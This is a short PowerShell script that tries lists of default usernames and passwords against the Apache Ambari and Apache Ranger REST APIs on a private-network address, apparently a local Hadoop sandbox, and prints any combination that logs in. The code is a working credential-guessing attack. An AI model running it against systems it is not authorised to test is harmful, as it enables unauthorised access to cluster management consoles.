$vmIp = "192.168.110.131"
$users = @("admin", "raj_ops", "atlas", "rangeradmin", "holger_gov")
$passwords = @("admin", "admin123", "hadoop", "raj_ops", "atlas", "rangeradmin", "holger_gov", "password", "ensias2025")

$ambariUrl = "http://$vmIp:8080/api/v1/clusters"
$rangerUrl = "http://$vmIp:6080/service/public/v2/api/service/definitions"

function Test-Auth-V2($url, $u, $p, $service) {
    $pair = "$($u):$($p)"
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
    $base64 = [System.Convert]::ToBase64String($bytes)
    $headers = @{ "Authorization" = "Basic $base64" }
    
    try {
        $resp = Invoke-WebRequest -Uri $url -Headers $headers -Method Get -TimeoutSec 5 -ErrorAction Stop
        if ($resp.StatusCode -eq 200) {
            Write-Host "SUCCESS: $service works with $u : $p"
            return $true
        }
    } catch {
        $status = $_.Exception.Response.StatusCode.value__
        if ($status -eq 200) {
             Write-Host "SUCCESS: $service works with $u : $p"
             return $true
        }
        # Write-Host "$service : $u : $p -> $status"
    }
    return $false
}

Write-Host "--- Testing Apache Ambari (Port 8080) ---"
$foundAmbari = $false
foreach ($u in $users) {
    foreach ($p in $passwords) {
        if (Test-Auth-V2 $ambariUrl $u $p "Ambari") { $foundAmbari = $true; break }
    }
    if ($foundAmbari) { break }
}

Write-Host "`n--- Testing Apache Ranger (Port 6080) ---"
$foundRanger = $false
foreach ($u in $users) {
    foreach ($p in $passwords) {
        if (Test-Auth-V2 $rangerUrl $u $p "Ranger") { $foundRanger = $true; break }
    }
    if ($foundRanger) { break }
}
